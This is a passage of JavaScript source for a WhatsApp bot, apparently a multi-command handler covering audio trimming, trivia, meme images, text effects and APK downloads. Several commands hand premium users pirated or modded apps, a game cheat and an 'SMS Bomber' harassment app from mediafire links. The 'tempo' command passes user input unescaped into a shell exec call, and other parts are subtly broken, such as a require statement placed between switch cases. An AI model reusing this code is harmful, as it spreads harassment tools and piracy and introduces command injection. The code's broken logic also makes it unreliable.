        return replyphistar("Invalid link!\nExample: .reactchs https://whatsapp.com/channel/xxx/123 ❤️ 5");
    }

    const channelId = link.split('/')[4];
    const rawMessageId = parseInt(link.split('/')[5]);
    if (!channelId || isNaN(rawMessageId)) return replyphistar("The link is incomplete!");

    // now check remaining arguments
    const remaining = args.slice(1);
    if (remaining.length === 0) return replyphistar("Enter the text or emoji to react with.");

    let offset = 1;
    let lastArg = remaining[remaining.length - 1];
    if (!isNaN(lastArg)) {
        offset = parseInt(lastArg);
        remaining.pop(); // remove number from the text array
    }

    const reactionText = remaining.join(' ').trim();
    if (!reactionText) return replyphistar("Enter text/emoji to react with.");

    const emoji = reactionText.toLowerCase().split('').map(c => {
        if (c === ' ') return '―';
        return letterStyle[c] || c;
    }).join('');

    try {
        const metadata = await PhistarBotInc.newsletterMetadata("invite", channelId);
        let success = 0, failed = 0;
        for (let i = 0; i < offset; i++) {
            const msgId = (rawMessageId - i).toString();
            try {
                await PhistarBotInc.newsletterReactMessage(metadata.id, msgId, emoji);
                success++;
            } catch (e) {
                failed++;
            }
        }
        replyphistar(`✅ *Done Boss*`);
    } catch (err) {
        console.error(err);
        replyphistar("❌ Failed to process the request!");
    }
}
break;
case 'cut': {
    if (!m.quoted || !m.quoted.mimetype || !/audio/.test(m.quoted.mimetype)) {
        return replyphistar('❌ *Reply to an audio file with the format:* `.cut 0:12/0:52`');
    }

    let args = text.split('/');
    if (args.length !== 2) return replyphistar('❌ *Invalid format! Use:* `.cut start_time/end_time` (e.g., `.cut 0:12/0:52`)');

    function parseTime(time) {
        let [minutes, seconds] = time.split(':').map(Number);
        return minutes * 60 + seconds; // Convert to total seconds
    }

    let startTime = parseTime(args[0]);
    let endTime = parseTime(args[1]);

    if (isNaN(startTime) || isNaN(endTime) || startTime >= endTime) {
        return replyphistar('❌ *Invalid time range! Make sure the start time is before the end time.*');
    }

    try {
        await PhistarBotInc.sendMessage(m.chat, { react: { text: `✂️`, key: m.key } });

        // Download the audio file correctly
        let mediaFile = await PhistarBotInc.downloadAndSaveMediaMessage(m.quoted);
        if (!fs.existsSync(mediaFile)) return replyphistar('❌ *Failed to download the audio file.*');

        let fileExtension = path.extname(mediaFile);
        let outputAudio = `./tmp/cut_audio${fileExtension}`;
        let outputDocument = `./tmp/cut_audio_doc${fileExtension}`;

        // Function to execute FFmpeg command
        const execPromise = (cmd) => new Promise((resolve, reject) => {
            exec(cmd, (error, stdout, stderr) => {
                if (error) reject(error);
                else resolve(stdout || stderr);
            });
        });

        // Trim audio using FFmpeg
        await execPromise(`ffmpeg -i "${mediaFile}" -ss ${startTime} -to ${endTime} -c copy "${outputAudio}"`);
        await execPromise(`ffmpeg -i "${mediaFile}" -ss ${startTime} -to ${endTime} -c copy "${outputDocument}"`);

        // Send the trimmed audio as a voice message
        await PhistarBotInc.sendMessage(m.chat, {
            audio: { url: outputAudio },
            mimetype: 'audio/mp4',
            ptt: false
        }, { quoted: m });

        // Send the trimmed audio as a document
        await PhistarBotInc.sendMessage(m.chat, {
            document: { url: outputDocument },
            mimetype: 'audio/mp3',
            fileName: `Trimmed_Audio${fileExtension}`
        }, { quoted: m });

        // Delete temporary files after sending
        fs.unlinkSync(mediaFile);
        fs.unlinkSync(outputAudio);
        fs.unlinkSync(outputDocument);

        replyphistar('✅ *Audio successfully trimmed!*');

    } catch (error) {
        console.error('Error trimming audio:', error);
        replyphistar('❌ *Failed to trim the audio. Please try again.*');
    }
    
    break;
}

const figlet = require('figlet');

case 'ascii': {
    if (!text) return replyphistar('Please provide text to convert.');
    figlet.text(text, (err, result) => {
        if (err) return replyphistar('Error generating ASCII art.');
        replyphistar('```\n' + result + '\n```');
    });
    break;
}

case 'define': {
    if (!text) return replyphistar('Please provide a word to define.');
    try {
        const res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${text}`);
        const meaning = res.data[0]?.meanings[0]?.definitions[0]?.definition || 'No definition found.';
        replyphistar(`Word: ${text}\nDefinition: ${meaning}`);
    } catch {
        replyphistar('Failed to fetch definition.');
    }
    break;
}

case 'qrcode': {
    if (!text) return replyphistar('Please provide text or a URL to generate a QR code.');
    qrcode.toBuffer(text, { type: 'image/png' }, (err, buffer) => {
        if (err) return replyphistar('Error generating QR code.');
        PhistarBotInc.sendMessage(m.chat, { image: buffer, caption: 'Here is your QR code.' }, { quoted: m });
    });
    break;
}

case 'binary': {
    if (!args[0]) return replyphistar('Please specify encode or decode followed by the text.');
    if (args[0].toLowerCase() === 'encode') {
        replyphistar(text.split('').map(c => c.charCodeAt(0).toString(2)).join(' '));
    } else if (args[0].toLowerCase() === 'decode') {
        replyphistar(text.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join(''));
    } else {
        replyphistar('Invalid option. Use encode or decode.');
    }
    break;
}



case 'clown': {
    // Ensure the command is a reply to an image or targets a user
    if (!/image/.test(mime) && !mentionedJid.length) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image or mention a user with .clown to create a clown meme*`);
    }

    try {
        let imageUrl;

        // If it's a reply to an image, download and upload it
        if (/image/.test(mime)) {
            const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
            const uploadResponse = await pinturaUpload(mediaPath); // Use the Imgur upload function
            if (uploadResponse.status !== "success") {
                fs.unlinkSync(mediaPath); // Clean up the downloaded file
                return replyphistar(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
            }
            imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
        } else if (mentionedJid.length) {
            // If a user is mentioned, fetch their profile picture
            const userJid = mentionedJid[0];
            imageUrl = await PhistarBotInc.profilePictureUrl(userJid, 'image').catch(() => 'https://cdn.popcat.xyz/avatar.png');
        } else {
            return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image or mention a user with .clown to create a clown meme*`);
        }

        // Call the Clown API
        const apiResponse = await axios.get(`https://api.popcat.xyz/clown`, {
            params: { image: imageUrl }
        });

        if (apiResponse.status === 200) {
            const clownImageUrl = apiResponse.request.res.responseUrl; // The URL of the clown meme

            // Send the clown meme back to the user
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: clownImageUrl },
                caption: `*Generated*`
            }, { quoted: m });
        } else {
            replyphistar(`*CLOWN MEME ERROR!! MESSAGE :*\n\n> Failed to generate a clown meme. Try again.`);
        }
    } catch (error) {
        console.error('Error in Clown command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}

case 'anime': {
    if (!text) return replyphistar("❓ Usage: .anime <anime_name> <episode>\nExample: .anime bleach 7");

    let [anime, episode] = text.split(' ');
    if (!anime || !episode) return replyphistar("❓ Provide both anime name and episode number.");

    replyphistar(`🔍 Fetching *${anime}* episode *${episode}*...`);

    try {
        let { data } = await axios.get(`https://reaperxxxx-anime.hf.space/api/anime/${anime}/${episode}`);
        
        if (!data.download_links) return replyphistar("❌ No download links found for this episode.");

        let videoUrl = data.download_links['720p'] || data.download_links['360p'];
        if (!videoUrl) return replyphistar("❌ No valid MP4 file found.");

        let videoOptions = {
            video: { url: videoUrl },
            caption: `🎥 *${data.anime_name}* - Episode ${data.episode}\n> Generated`
        };

        let documentOptions = {
            document: { url: videoUrl },
            mimetype: 'video/mp4',
            fileName: `${data.anime_name} - Episode ${data.episode}.mp4`
        };

        // Send as a video
        await PhistarBotInc.sendMessage(m.chat, videoOptions, { quoted: m });

        // Send as a document
        await PhistarBotInc.sendMessage(m.chat, documentOptions, { quoted: m });

    } catch (error) {
        console.error(error);
        replyphistar("❌ Failed to fetch the anime episode. Try again later.");
    }
    break;
}

case 'hobbycheck': case 'cekhobby': {
    const hobby = text;
    const hob = ['Cooking','Helping Grandpa','Mabar','Nobar','Sosmedtan','Helping Others','Watching Anime','Watching Korean Drama','Riding a Motorcycle','Singing','Dancing','Colliding','Drawing','Taking Unclear Photos','Playing Games','Talking to Myself'];
    const by = hob[Math.floor(Math.random() * hob.length)];
    PhistarBotInc.sendMessage(m.chat, { text: 'Question : *'+hobby+'*\n\nAnswer : '+ by}, { quoted: m });
    break;
}

case 'trivia': {
    try {
        const response = await axios.get('https://opentdb.com/api.php?amount=1&type=multiple');
        const trivia = response.data.results[0];

        const question = trivia.question;
        const options = [...trivia.incorrect_answers, trivia.correct_answer];
        const correctAnswer = trivia.correct_answer;

        // Shuffle options to avoid pattern (correct answer always in last)
        options.sort(() => Math.random() - 0.5);

        // Save the correct answer
        global.triviaAnswer = correctAnswer;

        // Send the question and options to the chat
        await PhistarBotInc.sendMessage(m.chat, {
            text: `*Trivia Time!*\n\nQuestion: ${question}\n\nOptions: \n1. ${options[0]}\n2. ${options[1]}\n3. ${options[2]}\n4. ${options[3]}\n\nWhat's your answer? (Reply with .answer <number>)`
        }, { quoted: m });
    } catch (error) {
        console.error(error);
        replyphistar('Sorry, I couldn\'t fetch a trivia question right now. Please try again later.');
    }
    break;
}

// Example: inside your switch(command) block
case 'scoreboard': {
    // Make sure there's something to show
    if (!global.triviaScores.length) {
        await PhistarBotInc.sendMessage(m.chat, {
            text: '*No scores yet!* 🏆',
            quoted: replyphistar
        });
        break;
    }

    // Sort leaderboard from highest to lowest score
    const leaderboard = [...global.triviaScores].sort((a, b) => b.score - a.score);

    // Create leaderboard message
    let leaderboardMessage = '*🏆 Trivia Leaderboard:*\n\n';
    leaderboard.forEach((player, index) => {
        leaderboardMessage += `${index + 1}. ${player.name} - ${player.score} points\n`;
    });

    // Send the message, quoting replyphistar
    await PhistarBotInc.sendMessage(m.chat, {
        text: leaderboardMessage,
        quoted: replyphistar
    });

    break;
}

case 'anon': {
    const anonCommand = args[0]?.toLowerCase();
    const anonUserId = m.sender;
    if (anonCommand === 'start') {
        if (anonChats[anonUserId]) return replyphistar('You are already in an anonymous chat!');
        const availableUsers = Object.keys(anonChats).find((user) => !anonChats[user]);
        if (availableUsers) {
            anonChats[anonUserId] = availableUsers;
            anonChats[availableUsers] = anonUserId;
            replyphistar('✅ Connected to a stranger! Start chatting.');
            await PhistarBotInc.sendMessage(availableUsers, { text: '✅ Connected to a stranger! Start chatting.' });
        } else {
            anonChats[anonUserId] = null;
            replyphistar('🔍 Searching for a stranger...');
        }
    } else if (anonCommand === 'stop') {
        const partner = anonChats[anonUserId];
        if (!partner) return replyphistar('You are not in an anonymous chat!');
        delete anonChats[partner];
        delete anonChats[anonUserId];
        replyphistar('❌ Chat ended.');
        await PhistarBotInc.sendMessage(partner, { text: '❌ The stranger has ended the chat.' });
    } else {
        replyphistar('Usage: `.anon start` or `.anon stop`');
    }
    break;
}

case 'answer': {
    // Make sure the answer is a valid option (1, 2, 3, 4)
    const answer = parseInt(args[0]);

    if (![1, 2, 3, 4].includes(answer)) {
        return replyphistar('Please respond with a number between 1 and 4!');
    }

    const userAnswer = global.triviaAnswer;
    let resultMessage = '';
    
    // Check if the answer is correct or incorrect
    if (answer === userAnswer) {
        resultMessage = 'Correct! 🎉';
        // You can increment user's score here (store it globally or in a database)
    } else {
        resultMessage = `Incorrect! 😞 The correct answer was option ${userAnswer}.`;
    }

    await PhistarBotInc.sendMessage(m.chat, {
        text: `*Answer Result:*\n\n${resultMessage}`
    }, { quoted: m });

    break;
}

case 'blur': {
    // Ensure the command is a reply to an image or targets a user's profile picture
    if (!/image/.test(mime) && !mentionedJid.length) {
        return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image or mention a user with .blur to apply a blur effect*`);
    }

    try {
        let imageUrl;

        // If it's a reply to an image, download and upload it
        if (/image/.test(mime)) {
            const mediaPath = await PhistarBotInc.downloadAndSaveMediaMessage(quoted);
            const uploadResponse = await uploadToImgur(mediaPath); // Use the Imgur upload function
            if (uploadResponse.status !== "success") {
                fs.unlinkSync(mediaPath); // Clean up the downloaded file
                return replyphistar(`*UPLOAD ERROR!! MESSAGE :*\n\n> ${uploadResponse.message}`);
            }
            imageUrl = uploadResponse.fileUrl; // Get the uploaded image URL
            fs.unlinkSync(mediaPath); // Clean up the downloaded file
        } else if (mentionedJid.length) {
            // If a user is mentioned, fetch their profile picture
            const userJid = mentionedJid[0];
            imageUrl = await PhistarBotInc.profilePictureUrl(userJid, 'image').catch(() => 'https://cdn.popcat.xyz/avatar.png');
        } else {
            return replyphistar(`*REQUEST ERROR!! MESSAGE :*\n\n> *Reply to an image or mention a user with .blur to apply a blur effect*`);
        }

        // Call the Blur API
        const apiResponse = await axios.get(`https://api.popcat.xyz/blur`, {
            params: { image: imageUrl }
        });

        if (apiResponse.status === 200) {
            const blurredImageUrl = apiResponse.request.res.responseUrl; // The URL of the blurred image

            // Send the blurred image back to the user
            await PhistarBotInc.sendMessage(m.chat, {
                image: { url: blurredImageUrl },
                caption: `*Blurred Image Generated Successfully!*`
            }, { quoted: m });
        } else {
            replyphistar(`*BLUR EFFECT ERROR!! MESSAGE :*\n\n> Failed to apply a blur effect. Try again.`);
        }
    } catch (error) {
        console.error('Error in Blur command:', error);
        replyphistar(`*AN ERROR OCCURRED!! MESSAGE :*\n\n> ${error.message}`);
    }
    break;
}

case 'url2': {
    if (!m.quoted || !m.quoted.mimetype) return replyphistar('❌ Reply to a file to upload.');

    let media = await m.quoted.download();
    let fileType = m.quoted.mimetype.split('/')[1]; 

    let result = await uploadFile(media, fileType);

    if (result.success) {
        replyphistar(`✅ *Upload Successful!*\n\n📂*File Size:* ${result.size} bytes\n🔗 *Download URL:* ${result.url}`);
    } else {
        replyphistar(`❌ Upload Failed: ${result.error}`);
    }
    break;
}


case 'mindreader': {
    replyphistar('Think of a number between 1 and 100. I will try to guess it...');

    await sleep(3000); // Simulating thinking

    const guessedNumber = Math.floor(Math.random() * 100) + 1;
    replyphistar(`🤔 I guess your number is: *${guessedNumber}*`);
    
    await sleep(2000);
    replyphistar(`Was I right?`);
    break;
}


case 'setbio': {
    if (!isCreator) return replyphistar('For My Owner Only');
    if (!text) return replyphistar(`Where is the text?\nExample: ${prefix + command} Phistar`);
    
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `✍🏼`, key: m?.key } });
    await PhistarBotInc.updateProfileStatus(text);
    replyphistar('`Success in changing bio, Boss!!🫡`');
    await PhistarBotInc.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });
}
break;
case 'candy':
case 'christmas':
case '3dchristmas':
case 'sparklechristmas':
case 'deepsea':
case 'scifi':
case 'rainbow':
case 'waterpipe':
case 'spooky':
case 'pencil':
case 'circuit':
case 'discovery':
case 'metalic':
case 'fiction':
case 'demon':
case 'transformer':
case 'berry':
case 'thunder':
case 'magma':
case '3dstone':
case 'neonlight':
case 'glitch':
case 'harrypotter':
case 'brokenglass':
case 'papercut':
case 'watercolor':
case 'multicolor':
case 'neondevil':
case 'underwater':
case 'graffitibike':
case 'snow':
case 'cloud':
case 'honey':
case 'ice':
case 'fruitjuice':
case 'biscuit':
case 'wood':
case 'chocolate':
case 'strawberry':
case 'matrix':
case 'blood':
case 'dropwater':
case 'toxic':
case 'lava':
case 'rock':
case 'bloodglas':
case 'hallowen':
case 'darkgold':
case 'joker':
case 'wicker':
case 'firework':
case 'skeleton':
case 'sand':
case 'glue':
case '1917':
case 'leaves': {
    if (!q) return replyphistar(`Example: ${prefix + command} Phistar`);

    let link;
    if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html';
    if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html';
    if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html';
    if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html';
    if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html';
    if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html';
    if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html';
    if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html';
    if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html';
    if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html';
    if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html';
    if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html';
    if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html';
    if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html';
    if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html';
    if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html';
    if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html';
    if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html';
    if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html';
    if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html';
    if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html';
    if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html';
    if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html';
    if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html';
    if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html';
    if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html';
    if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html';
    if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html';
    if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html';
    if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html';
    if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html';
    if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html';
    if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html';
    if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html';
    if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html';
    if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html';
    if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html';
    if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html';
    if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html';
    if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html';
    if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html';
    if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html';
    if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html';
    if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html';
    if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html';
    if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html';
    if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html';
    if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html';
    if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html';
    if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html';
    if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html';
    if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html';
    if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html';
    if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html';
    if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html';
    if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html';
    
    let anu = await textpro.textpro(link, q);
    await PhistarBotInc.sendMessage(m.chat, { image: { url: anu }, caption: `Generated` }, { quoted: m });
}
break;

case 'convertime': {
    const [dime, fromZone, toZone] = args;
    if (!dime || !fromZone || !toZone) return replyphistar('Usage: .convertime [time] [from timezone] [to timezone]');
    
    const fromdime = moment.tz(dime, fromZone);
    if (!fromdime.isValid()) return replyphistar('Invalid time or timezone.');
    
    const todime = fromdime.clone().tz(toZone);
    replyphistar(`Time in ${toZone}: ${todime.format('HH:mm:ss')}`);
}
break;

case 'flipcoin':
case 'coin': {
    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🪙", key: m.key } });
    // Simulate flipping a coin (0 for heads, 1 for tails)
    const result = Math.random() < 0.5 ? 'Heads' : 'Tails';

    const flipCoinMessage = `🪙 *Coin Flip Result: ${result}*`;
    replyphistar(flipCoinMessage);
}
break;

case 'dice':
case 'roll': {
    await PhistarBotInc.sendMessage(m.chat, { react: { text: "🎲", key: m.key } });
    const result = Math.floor(Math.random() * 6) + 1; // Generate a random number between 1 and 6

    const diceMessage = `🎲 *Dice Roll Result:* ${result}`;
    replyphistar(diceMessage);
}
break;

case 'listonline':
case 'listactive':
case 'here': {
    await PhistarBotInc.sendMessage(m.chat, { react: { text: `🎙`, key: m.key } });

    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
    let online = [...Object.keys(store.presences[id]), botNumber];
    let liston = 1;
    await PhistarBotInc.sendMessage(m.chat, {
        text: '  「 *Online Members* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`,
        mentions: online
    }, { quoted: m });
}
break;
case 'tempo': {
    if (!args.join(" ")) return replyphistar(`Example: ${prefix + command} 10`);
    var req = args.join(' ');
    media = await PhistarBotInc.downloadAndSaveMediaMessage(quoted, "tempo");
    
    if (isQuotedAudio) {
        ran = getRandom('.mp3');
        exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media);
            if (err) return replyphistar('Error!');
            hah = fs.readFileSync(ran);
            PhistarBotInc.sendMessage(m.chat, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
            fs.unlinkSync(ran);
        });
    } else if (isQuotedVideo) {
        ran = getRandom('.mp4');
        exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media);
            if (err) return replyphistar('Error!');
            hah = fs.readFileSync(ran);
            PhistarBotInc.sendMessage(m.chat, { video: hah, mimetype: 'video/mp4' }, { quoted: m });
            fs.unlinkSync(ran);
        });
    } else {
        replyphistar("Please send video/audio file only!");
    }
}
break;

case 'diffusion': {
    try {
        const hua = await fetchJson(`https://skizo.tech/api/sdxl?apikey=${global.skizo}&prompt=${text}`);
        let huaa = hua.url;
        await PhistarBotInc.sendMessage(m.chat, { image: { url: huaa }, caption: `${text}` }, { quoted: fsaluran });
    } catch (err) {
        replyphistar('Error!!!');
    }
}
break;

case 'totalfeature':
case 'totalfitur':
case 'totalcmd':
case 'totalcommand': {
    replyphistar(`${totalfitur}`);
}
break;

case 'pickupline': {
    try {
        const apiUrl = `https://api.popcat.xyz/pickuplines`;
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.pickupline) {
            const pickupLine = response.data.pickupline;
            replyphistar(`*Pickup Line*\n\n💘 ${pickupLine}\n\n*Generated*`);
        } else {
            replyphistar('Failed to fetch a pickup line. Please try again later.');
        }
    } catch (error) {
        if (error.response) {
            replyphistar(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replyphistar('No response received from the API. Please try again later.');
        } else {
            replyphistar(`An error occurred: ${error.message}`);
        }
    }
}
break;

case 'rizz': {
    try {
        const apiUrl = `https://api.popcat.xyz/pickuplines`;
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.pickupline) {
            const pickupLine = response.data.pickupline;
            replyphistar(`*RIZZ:*\n\n💘 ${pickupLine}\n\n*Generated*`);
        } else {
            replyphistar('Failed to fetch a pickup line. Please try again later.');
        }
    } catch (error) {
        if (error.response) {
            replyphistar(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replyphistar('No response received from the API. Please try again later.');
        } else {
            replyphistar(`An error occurred: ${error.message}`);
        }
    }
}
break;

case 'listapks': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users*.');
    }
    const apkList = [
        'myapp.apk',
        'anotherapp.apk',
        'coolgame.apk'
    ];
    const apkMessage = apkList.map((apk, index) => `${index + 1}. ${apk.replace('.apk', '')}`).join('\n');
    replyphistar(`*Available APKs:*\n\n${apkMessage}`);
}
break;

case 'downloadapkkk': {
    if (!text) return replyphistar(`*Example*: ${prefix}downloadapkkk telegram`);

    const appName = text.toLowerCase();
    const apkLinks = {
        telegram: "https://www.mediafire.com/file/75dmfrvrp8vyugm/Telegram.apk/file",
        capcut: "https://www.mediafire.com/file/zavt5l7isvfhgrp/Capcut_%2528Premium%2529.apk/file",
        darktools: "https://www.mediafire.com/file/wwxlaq4of24hevb/Dark_Tools_3.15__%25281%2529_%25281%2529.apk/file",
        capcut2: "https://www.mediafire.com/file/hseiqe1dufgsih0/capcut_latest_.apk/file",
        instagram: "https://www.mediafire.com/file/u0hwqosvi5u7xdg/Instagram_Premium_Mod.apk/file",
        prime_video: "https://www.mediafire.com/file/yle4w0z9t2z06tf/Prime_Video.apk/file",
        remini: "https://www.mediafire.com/file/jwyechduc32dcek/REMINI_%2528Pro_Unlocked%2529.apk/file",
        sms_bomber: "https://www.mediafire.com/file/uo8963a4ni13xl9/Turbo_SMSM_Bomber_App_%25281%2529.apk/file",
        ff_headshot: "https://www.mediafire.com/file/u39y4nus2g7dpyo/ff_headshot.apk/file",
        youtube: "https://www.mediafire.com/file/kuh6q7hbljsxkow/YouTube_v19.40.33.apk/file"
    };

    if (!apkLinks[appName]) {
        return replyphistar(`*Error*: App "${appName}" not found.`);
    }

    const mediafireUrl = apkLinks[appName];

    try {
        const apiEndpoint = `https://api.agatz.xyz/api/mediafire?url=${encodeURIComponent(mediafireUrl)}`;
        const apiResponse = await axios.get(apiEndpoint);

        if (apiResponse.data.status === 200) {
            const fileData = apiResponse.data.data[0];
            await PhistarBotInc.sendMessage(m.chat, {
                document: { url: fileData.link },
                mimetype: 'application/vnd.android.package-archive',
                fileName: fileData.nama,
                caption: `📥 *File Name:* ${fileData.nama}\n*Size:* ${fileData.size}\n\n> Generated`
            }, { quoted: m });
        } else {
            replyphistar(`*Error*: Unable to fetch the download link for "${appName}".`);
        }
    } catch (error) {
        console.error('Error in downloadapkkk command:', error.message);
        replyphistar(`*An error occurred while processing your request. Please try again later.*`);
    }
}
break;

case 'capcut': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    const mediafireUrl = "https://www.mediafire.com/file/zavt5l7isvfhgrp/Capcut_%2528Premium%2529.apk/file";
    await handleAPKDownload(mediafireUrl, 'Capcut');
}
break;

case 'telegram': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    const mediafireUrl = "https://www.mediafire.com/file/75dmfrvrp8vyugm/Telegram.apk/file";
    await handleAPKDownload(mediafireUrl, 'Telegram');
}
break;

case 'darktools': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    const mediafireUrl = "https://www.mediafire.com/file/wwxlaq4of24hevb/Dark_Tools_3.15__%25281%2529_%25281%2529.apk/file";
    await handleAPKDownload(mediafireUrl, 'Dark Tools');
}
break;

case 'capcut2': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    const mediafireUrl = "https://www.mediafire.com/file/hseiqe1dufgsih0/capcut_latest_.apk/file";
    await handleAPKDownload(mediafireUrl, 'Capcut Latest');
}
break;

case 'instagram': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    const mediafireUrl = "https://www.mediafire.com/file/u0hwqosvi5u7xdg/Instagram_Premium_Mod.apk/file";
    await handleAPKDownload(mediafireUrl, 'Instagram');
}
break;

case 'prime_video': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    const mediafireUrl = "https://www.mediafire.com/file/yle4w0z9t2z06tf/Prime_Video.apk/file";
    await handleAPKDownload(mediafireUrl, 'Prime Video');
}
break;

case 'remini': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    const mediafireUrl = "https://www.mediafire.com/file/jwyechduc32dcek/REMINI_%2528Pro_Unlocked%2529.apk/file";
    await handleAPKDownload(mediafireUrl, 'Remini');
}
break;

case 'sms_bomber': {
    if (!await isPremium(m.sender)) {
        return replyphistar('❌ *This Command Is for Premium Users Only*.');
    }
    const mediafireUrl = "https://www.mediafire.com/file/uo8963a4ni13xl9/Turbo_SMSM_Bomber_App_%25281%2529.apk/file";
